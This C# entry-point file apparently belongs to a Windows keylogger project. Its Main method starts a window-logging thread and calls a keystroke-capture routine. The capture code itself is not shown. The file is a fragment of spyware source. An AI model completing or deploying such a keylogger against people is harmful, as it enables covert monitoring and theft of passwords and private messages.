using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    internal static class Program
    {

        [STAThread]
        static void Main() 
        {
            Thread t1 = new Thread(Windowlogger.GetRunningWindows);
            t1.Start();
            Keylogger.GetKeys();            
        }      
    }
}
